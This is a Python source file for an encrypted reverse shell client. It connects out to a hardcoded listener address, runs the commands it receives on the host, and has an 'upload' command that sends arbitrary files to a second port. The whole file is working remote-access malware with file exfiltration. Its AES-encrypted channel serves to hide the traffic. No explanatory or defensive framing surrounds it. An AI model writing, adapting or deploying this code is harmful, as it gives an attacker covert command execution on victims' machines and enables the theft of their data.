import socket
import subprocess
import base64
import struct
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'Sixteen byte key'  
BLOCK_SIZE = 16
SERVER_IP = "192.168.56.129"  
SERVER_PORT = 4444
EXFIL_PORT = 5555  
def decrypt_command(ciphertext):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    decrypted = unpad(cipher.decrypt(base64.b64decode(ciphertext)), BLOCK_SIZE)
    return decrypted.decode()

def encrypt_output(data):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    encrypted = base64.b64encode(cipher.encrypt(pad(data.encode(), BLOCK_SIZE)))
    return encrypted

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_msg(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    msg_len = struct.unpack('>I', raw_len)[0]
    return recvall(sock, msg_len)

def send_msg(sock, msg):
    msg_length = struct.pack('>I', len(msg))
    sock.sendall(msg_length + msg)

def exfiltrate_file(filename):
    try:
        with open(filename, 'rb') as f:
            data = f.read()

        exfil = socket.socket()
        exfil.connect((SERVER_IP, EXFIL_PORT))


        filename_bytes = filename.encode()
        exfil.sendall(struct.pack('>I', len(filename_bytes)))
        exfil.sendall(filename_bytes)

        exfil.sendall(struct.pack('>I', len(data)))
        exfil.sendall(data)

        exfil.close()
        return f"[+] File {filename} exfiltrated."

    except Exception as e:
        return f"[!] Exfiltration error: {str(e)}"

def main():
    s = socket.socket()
    s.connect((SERVER_IP, SERVER_PORT))

    while True:
        encrypted_command = recv_msg(s)
        if encrypted_command is None:
            print("[*] Connection closed by listener.")
            break

        command = decrypt_command(encrypted_command)

        if command.strip().lower() == "exit":
            break

        elif command.lower().startswith("upload "):
            filename = command.split(" ", 1)[1]
            result = exfiltrate_file(filename)

        else:
            result = subprocess.getoutput(command)

        encrypted_result = encrypt_output(result)
        send_msg(s, encrypted_result)

    s.close()

if __name__ == "__main__":
    main()
